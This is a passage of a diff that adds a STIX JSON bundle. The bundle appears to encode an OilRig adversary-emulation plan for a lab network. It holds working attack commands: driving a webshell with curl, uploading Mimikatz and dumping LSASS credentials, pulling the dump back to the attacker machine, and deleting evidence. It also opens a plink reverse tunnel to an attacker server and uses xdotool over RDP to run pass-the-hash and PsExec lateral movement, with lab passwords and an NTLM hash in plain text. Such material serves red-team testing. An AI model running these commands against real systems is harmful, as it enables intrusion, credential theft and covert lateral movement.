+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--7aaecfb7-a1eb-477c-8d53-ab3009389623",
+            "target_ref": "ipv4-addr--872df245-519f-5043-a2c5-77c3e0facd73"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--872df245-519f-5043-a2c5-77c3e0facd73",
+            "value": "10.1.0.6"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1b95138f-1b6d-401c-889a-f48c4595261a",
+            "created": "2024-02-04T21:17:50.932987Z",
+            "modified": "2024-02-04T21:17:50.932987Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--7aaecfb7-a1eb-477c-8d53-ab3009389623"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5f7dc4b3-1287-4a25-b0b0-b6e73756cc11",
+            "created": "2024-02-04T21:17:50.933211Z",
+            "modified": "2024-02-04T21:17:50.933211Z",
+            "name": "OilRig Set file hidden attribute",
+            "description": "Set file hidden attribute for contact.aspx on WATERFALLS\n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1082",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "attrib +h \"\\\\#{second.target.ip}\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\exchweb\\ews\\contact.aspx\""
+                            }
+                        }
+                    },
+                    "technique_name": "Hide Artifacts: Hidden Files & Directories"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--98a6a992-4c3e-4e22-8eef-1d4bb7ec596a",
+            "created": "2024-02-04T21:17:50.933433Z",
+            "modified": "2024-02-04T21:17:50.933433Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--5f7dc4b3-1287-4a25-b0b0-b6e73756cc11"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--87d3322b-a435-47b5-9f97-a8db4f86dad5",
+            "created": "2024-02-04T21:17:50.933651Z",
+            "modified": "2024-02-04T21:17:50.933651Z",
+            "name": "OilRig Current User (Kali Agent)",
+            "description": "Attacker machine obtains user from current session gosta's current session on 10.1.0.6",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1033",
+                    "input_arguments": {
+                        "initial.target.password": {
+                            "default": "d0ntGoCH4ingW8trfalls",
+                            "description": "The password of the target host for initial access.",
+                            "type": "string"
+                        },
+                        "network.domain.name": {
+                            "default": "boom.box",
+                            "description": "Network domain name for initial target system.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST --data \"pro=cmd.exe\" --data \"cmd=whoami\" https://#{second.target.ip}/ews/contact.aspx\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Owner/User Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a312fc39-7e37-4053-a4d8-4a94c87000f8",
+            "created": "2024-02-04T21:17:50.934767Z",
+            "modified": "2024-02-04T21:17:50.934767Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--87d3322b-a435-47b5-9f97-a8db4f86dad5",
+            "target_ref": "user-account--aa78eacf-90a3-4896-a913-c834fb9a7791"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--aa78eacf-90a3-4896-a913-c834fb9a7791",
+            "credential": "d0ntGoCH4ingW8trfalls"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--41a63ec6-e7c1-4210-8927-cf40ddc52de1",
+            "created": "2024-02-04T21:17:50.935605Z",
+            "modified": "2024-02-04T21:17:50.935605Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--87d3322b-a435-47b5-9f97-a8db4f86dad5",
+            "target_ref": "domain-name--a8e9543d-82c6-5ea8-b051-f30de58ae28a"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--a8e9543d-82c6-5ea8-b051-f30de58ae28a",
+            "value": "boom.box"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--58888152-b94b-4cc8-bef8-3a2af39887e6",
+            "created": "2024-02-04T21:17:50.935944Z",
+            "modified": "2024-02-04T21:17:50.935944Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--87d3322b-a435-47b5-9f97-a8db4f86dad5"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--48927544-5a18-11ed-9b6a-0242ac120002",
+            "created": "2024-02-04T21:17:50.936245Z",
+            "modified": "2024-02-04T21:17:50.936245Z",
+            "name": "OilRig Network Interface Configuration (Kali Agent)",
+            "description": "Attacker machine views network configuration information for gosta on 10.1.0.6",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1016",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST --data \"pro=cmd.exe\" --data \"cmd=ipconfig /all\" https://#{second.target.ip}/ews/contact.aspx\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Network Configuration Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a6eac3b6-2225-4e2f-9195-e0743c6697ee",
+            "created": "2024-02-04T21:17:50.936586Z",
+            "modified": "2024-02-04T21:17:50.936586Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--48927544-5a18-11ed-9b6a-0242ac120002"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5c279562-a004-4d9c-9ec6-a7dc4997f699",
+            "created": "2024-02-04T21:17:50.936896Z",
+            "modified": "2024-02-04T21:17:50.936896Z",
+            "name": "OilRig View Network Connections (Kali Agent)",
+            "description": "Attacker machine views system network connections for gosta on 10.1.0.6",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1049",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST --data \"pro=cmd.exe\" --data \"cmd=netstat -an\" https://#{second.target.ip}/ews/contact.aspx\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Network Connections Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2b5ff2f3-0739-4c05-88d4-b1ef326a066f",
+            "created": "2024-02-04T21:17:50.937188Z",
+            "modified": "2024-02-04T21:17:50.937188Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--5c279562-a004-4d9c-9ec6-a7dc4997f699"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f96e8195-8b0f-4b87-bdce-748dfda2861f",
+            "created": "2024-02-04T21:17:50.939107Z",
+            "modified": "2024-02-04T21:17:50.939107Z",
+            "name": "OilRig Download Mimikatz (Kali Agent)",
+            "description": "Download Mimikatz",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1105",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST -F \"upl=f1\" -F 'sav=C:\\Windows\\temp\\' -F \"vir=false\" -F \"nen=m64.exe\" -F 'f1=@m64.exe' https://#{second.target.ip}/EWS/contact.aspx\n",
+                                "payloads": [
+                                    "m64.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--99492c44-7dae-41d7-8db4-3e599e4f3ba1",
+            "created": "2024-02-04T21:17:50.939669Z",
+            "modified": "2024-02-04T21:17:50.939669Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--f96e8195-8b0f-4b87-bdce-748dfda2861f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f01e86f9-0b66-4191-beee-324c380690df",
+            "created": "2024-02-04T21:17:50.940011Z",
+            "modified": "2024-02-04T21:17:50.940011Z",
+            "name": "OilRig Execute Mimikatz (Kali Agent)",
+            "description": "Dump credentials using Mimikatz",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1003.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST --data \"pro=cmd.exe\" --data \"cmd=C:\\Windows\\Temp\\m64.exe privilege::debug sekurlsa::logonPasswords exit 1> C:\\Windows\\Temp\\01.txt\" https://#{second.target.ip}/ews/contact.aspx\n"
+                            }
+                        }
+                    },
+                    "technique_name": "OS Credential Dumping: LSASS Memory"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e343eff9-6a87-4509-8126-e8c1be4c2e04",
+            "created": "2024-02-04T21:17:50.940249Z",
+            "modified": "2024-02-04T21:17:50.940249Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--f01e86f9-0b66-4191-beee-324c380690df"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--845d36f1-13b6-4d42-a384-aa2f4af9bc27",
+            "created": "2024-02-04T21:17:50.940526Z",
+            "modified": "2024-02-04T21:17:50.940526Z",
+            "name": "OilRig Exfiltrate Mimikatz Output (Kali Agent)",
+            "description": "Exfiltrate the resulting output file to the attacker system",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1041",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST -o 01.txt --data 'don=c:\\windows\\temp\\01.txt' https://#{second.target.ip}/EWS/contact.aspx\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Exfiltration Over C2 Channel"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e25f29e7-78ce-4d37-89d9-cd9adebb19f0",
+            "created": "2024-02-04T21:17:50.940747Z",
+            "modified": "2024-02-04T21:17:50.940747Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--845d36f1-13b6-4d42-a384-aa2f4af9bc27"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--6482ba12-fa47-409c-bab8-704de6475e38",
+            "created": "2024-02-04T21:17:50.941023Z",
+            "modified": "2024-02-04T21:17:50.941023Z",
+            "name": "OilRig Delete Mimikatz and MimiKatz Output (Kali Agent)",
+            "description": "Clean up by removing the binary and output file",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1070.004",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST --data \"pro=cmd.exe\" --data \"cmd=del C:\\windows\\temp\\01.txt C:\\windows\\temp\\m64.exe\" https://#{second.target.ip}/EWS/contact.aspx\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Indicator Removal on Host: File Deletion"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8e6d6e25-eed3-420a-bdce-6e61ce543f5e",
+            "created": "2024-02-04T21:17:50.941306Z",
+            "modified": "2024-02-04T21:17:50.941306Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--6482ba12-fa47-409c-bab8-704de6475e38"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f3df5a83-2a5a-4277-8763-8fb51032d3fc",
+            "created": "2024-02-04T21:17:50.941661Z",
+            "modified": "2024-02-04T21:17:50.941661Z",
+            "name": "OilRig Download Plink",
+            "description": "Download Plink in order to gain RDP access\n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1105",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "copy  C:\\Users\\#{initial.target.user}\\AppData\\Local\\SystemFailureReporter\\plink.exe C:\\Users\\Public\\Downloads\\plink.exe\n",
+                                "payloads": [
+                                    "plink.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5fe409d4-4c97-4f08-be7c-04d1b0f6e673",
+            "created": "2024-02-04T21:17:50.941887Z",
+            "modified": "2024-02-04T21:17:50.941887Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--f3df5a83-2a5a-4277-8763-8fb51032d3fc"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--212995b5-acfc-404b-b3a9-a19cc0afa9a5",
+            "created": "2024-02-04T21:17:50.94209Z",
+            "modified": "2024-02-04T21:17:50.94209Z",
+            "name": "OilRig Run Plink",
+            "description": "Run Plink\n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1572",
+                    "input_arguments": {
+                        "caldera.server.ip": {
+                            "default": "192.168.0.4",
+                            "description": "The IPv4 address of the attacker system.",
+                            "type": "string"
+                        },
+                        "caldera.user.name": {
+                            "default": "saka",
+                            "description": "The username of the attacker system.",
+                            "type": "string"
+                        },
+                        "caldera.user.password": {
+                            "default": "ceKa#zUUc4^9yZ",
+                            "description": "The password for the attacker system.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "proc": {
+                                "command": "exec-background C:\\Users\\Public\\Downloads\\plink.exe -no-antispoof -ssh -N -R #{caldera.server.ip}:13389:#{second.target.ip}:3389 -l #{caldera.user.name} -pw \"#{caldera.user.password}\" #{caldera.server.ip}\n",
+                                "timeout": 120
+                            }
+                        }
+                    },
+                    "technique_name": "Protocol Tunneling"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--0d163f0b-4348-4917-b0c0-7b3b387dbd71",
+            "created": "2024-02-04T21:17:50.942606Z",
+            "modified": "2024-02-04T21:17:50.942606Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--212995b5-acfc-404b-b3a9-a19cc0afa9a5",
+            "target_ref": "ipv4-addr--64e66d5a-6589-5204-9804-bf24ba8cfeef"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--64e66d5a-6589-5204-9804-bf24ba8cfeef",
+            "value": "192.168.0.4"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--0c1341e2-95a9-416d-99cf-0f2ce77fdee6",
+            "created": "2024-02-04T21:17:50.94334Z",
+            "modified": "2024-02-04T21:17:50.94334Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--212995b5-acfc-404b-b3a9-a19cc0afa9a5",
+            "target_ref": "user-account--fdef3714-81b5-4b4d-b221-1ae8324656ec"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--fdef3714-81b5-4b4d-b221-1ae8324656ec",
+            "credential": "ceKa#zUUc4^9yZ"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--3a9a9f29-fd82-4d67-87fd-61800454a402",
+            "created": "2024-02-04T21:17:50.944027Z",
+            "modified": "2024-02-04T21:17:50.944027Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--212995b5-acfc-404b-b3a9-a19cc0afa9a5",
+            "target_ref": "user-account--56de2605-8125-5a6a-846b-6a955866d282"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--56de2605-8125-5a6a-846b-6a955866d282",
+            "account_login": "saka"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5bb798a5-cfd7-41a2-a326-c09cfe25d314",
+            "created": "2024-02-04T21:17:50.944393Z",
+            "modified": "2024-02-04T21:17:50.944393Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--212995b5-acfc-404b-b3a9-a19cc0afa9a5"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--dc2efbdd-3ab4-44a0-9839-385540b8a8cc",
+            "created": "2024-02-04T21:17:50.944608Z",
+            "modified": "2024-02-04T21:17:50.944608Z",
+            "name": "OilRig RDP to WATERFALLS",
+            "description": "RDP to 10.1.0.6 using xfreerdp\n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1021.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "proc": {
+                                "command": "exec-background xfreerdp /u:'#{network.domain.name}\\#{initial.target.user}' /p:'#{initial.target.password}' /v:localhost:13389 /cert-ignore\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote Services: Remote Desktop Protocol"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a76ae1d2-0c67-4c33-b941-f0594afc9a44",
+            "created": "2024-02-04T21:17:50.944801Z",
+            "modified": "2024-02-04T21:17:50.944801Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--dc2efbdd-3ab4-44a0-9839-385540b8a8cc"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5cb977ae-87c8-450f-b016-f414b42ba60f",
+            "created": "2024-02-04T21:17:50.945039Z",
+            "modified": "2024-02-04T21:17:50.945039Z",
+            "name": "OilRig Downloads PsExec",
+            "description": "OilRig uses the webshell to download PsExec as ps.exe to WATERFALLS",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1105",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST -F \"upl=f1\" -F 'sav=C:\\Windows\\System32' -F \"vir=false\" -F \"nen=ps.exe\" -F 'f1=@PsExec.exe' https://#{second.target.host}/ews/contact.aspx\n",
+                                "payloads": [
+                                    "PsExec.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a100cd16-8374-440f-88a0-8ef451997c0e",
+            "created": "2024-02-04T21:17:50.945265Z",
+            "modified": "2024-02-04T21:17:50.945265Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--5cb977ae-87c8-450f-b016-f414b42ba60f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--d5b83af2-b79e-438d-acfc-2641282df698",
+            "created": "2024-02-04T21:17:50.945492Z",
+            "modified": "2024-02-04T21:17:50.945492Z",
+            "name": "OilRig Downloads RDAT",
+            "description": "OilRig uses the webshell to download RDAT as nt.dat to WATERFALLS",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1105",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST -F \"upl=f1\" -F 'sav=C:\\Windows\\Temp' -F \"vir=false\" -F \"nen=Nt.dat\" -F 'f1=@RDAT.exe' https://#{second.target.host}/ews/contact.aspx\n",
+                                "payloads": [
+                                    "RDAT.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--89c78f66-6aa2-40e2-90ef-6ec869cb0abe",
+            "created": "2024-02-04T21:17:50.945673Z",
+            "modified": "2024-02-04T21:17:50.945673Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--d5b83af2-b79e-438d-acfc-2641282df698"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--98279c81-d5a0-4ec4-9d40-a6e87d1f9bd2",
+            "created": "2024-02-04T21:17:50.94594Z",
+            "modified": "2024-02-04T21:17:50.94594Z",
+            "name": "OilRig Downloads mom64.exe",
+            "description": "OilRig uses the webshell to download Mimikatz as mom64.exe to WATERFALLS",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1105",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST -F \"upl=f1\" -F 'sav=C:\\Windows\\System32' -F \"vir=false\" -F \"nen=mom64.exe\" -F 'f1=@m64.exe' https://#{second.target.host}/ews/contact.aspx\n",
+                                "payloads": [
+                                    "m64.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--fd09e6bf-cd6f-4150-8faa-dbe43e21f2ae",
+            "created": "2024-02-04T21:17:50.94614Z",
+            "modified": "2024-02-04T21:17:50.94614Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--98279c81-d5a0-4ec4-9d40-a6e87d1f9bd2"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--44073aa3-70e9-4a48-86b7-c25b6f29c25c",
+            "created": "2024-02-04T21:17:50.946334Z",
+            "modified": "2024-02-04T21:17:50.946334Z",
+            "name": "OilRig PSEXEC is used to execute commands on ENDOFROAD",
+            "description": "Requires xdotool to be installed on the running machine. \nUses xdotool to control the RDP window to 10.1.0.6 that was opened in Step 7.A.4. \nExecutes Mimikatz PTH, copies RDAT to 10.1.0.7, and PsExecs to the SQL server\n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1569.002",
+                    "input_arguments": {
+                        "second.target.ntlm": {
+                            "default": "9b7ff4cc0878bee9f099a4a7dc7227c3",
+                            "description": "NTLM hash value for the user of the SQL server administrator.",
+                            "type": "string"
+                        },
+                        "second.target.user": {
+                            "default": "tous",
+                            "description": "The username for the SQL server administrator.",
+                            "type": "string"
+                        },
+                        "third.target.ip": {
+                            "default": "10.1.0.7",
+                            "description": "The IPv4 address of the SQL server.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "sleep 5;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:localhost\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nxdotool key --window \"$rdp_window\" Super_L;\nsleep 5; \nxdotool windowactivate --sync \"$rdp_window\" type --delay 200 \"cmd\";\nsleep 3; \nxdotool key --window \"$rdp_window\" Ctrl+Shift+Return;\nsleep 3; \nxdotool key --window \"$rdp_window\" Tab Tab;\nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'C:\\Windows\\System32\\mom64.exe \"privilege::debug\" \"sekurlsa::pth /user:#{second.target.user} /domain:#{network.domain.name} /ntlm:#{second.target.ntlm}\"';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'copy C:\\Windows\\Temp\\Nt.dat \\\\#{third.target.ip}\\C$\\ProgramData\\';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'C:\\Windows\\System32\\ps.exe \\\\#{third.target.ip} cmd.exe';\nxdotool key --window \"$rdp_window\" Return;\nsleep 5;\n",
+                                "timeout": 150
+                            }
+                        }
+                    },
+                    "technique_name": "System Services: Service Execution"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--17aaa8c6-5063-4a06-af51-645f09bd59a4",
+            "created": "2024-02-04T21:17:50.946942Z",
+            "modified": "2024-02-04T21:17:50.946942Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--44073aa3-70e9-4a48-86b7-c25b6f29c25c",
+            "target_ref": "user-account--ed7b4607-b524-5f45-8350-de23ddba54f5"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--ed7b4607-b524-5f45-8350-de23ddba54f5",
+            "account_login": "tous"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--3ef98b04-fdeb-4b79-b901-b60db52317db",
+            "created": "2024-02-04T21:17:50.947719Z",
+            "modified": "2024-02-04T21:17:50.947719Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--44073aa3-70e9-4a48-86b7-c25b6f29c25c",
+            "target_ref": "artifact--0d5e8c91-6bee-5079-b273-b49ea253be0f"
+        },
+        {
+            "type": "artifact",
+            "spec_version": "2.1",
+            "id": "artifact--0d5e8c91-6bee-5079-b273-b49ea253be0f",
+            "url": "",
+            "hashes": {
+                "MD5": "9b7ff4cc0878bee9f099a4a7dc7227c3"
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f81f9fbe-910b-44ae-bde1-65df70f00f52",
+            "created": "2024-02-04T21:17:50.948275Z",
+            "modified": "2024-02-04T21:17:50.948275Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--44073aa3-70e9-4a48-86b7-c25b6f29c25c",
+            "target_ref": "ipv4-addr--682f2627-2cb3-5767-8cb2-e8e0348e4cc1"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--682f2627-2cb3-5767-8cb2-e8e0348e4cc1",
+            "value": "10.1.0.7"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d871308e-c8c4-4d0f-a90a-585ebee26805",
+            "created": "2024-02-04T21:17:50.948516Z",
+            "modified": "2024-02-04T21:17:50.948516Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--44073aa3-70e9-4a48-86b7-c25b6f29c25c"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f1f34439-ca0d-4fe7-99af-a198a29b6a3e",
+            "created": "2024-02-04T21:17:50.948718Z",
+            "modified": "2024-02-04T21:17:50.948718Z",
+            "name": "OilRig File and Directory Discovery on ENDOFROAD",
+            "description": "Requires xdotool to be installed on the running machine. \nUses xdotool to execute file and directory discovery commands on ENDOFROAD\n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1083",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
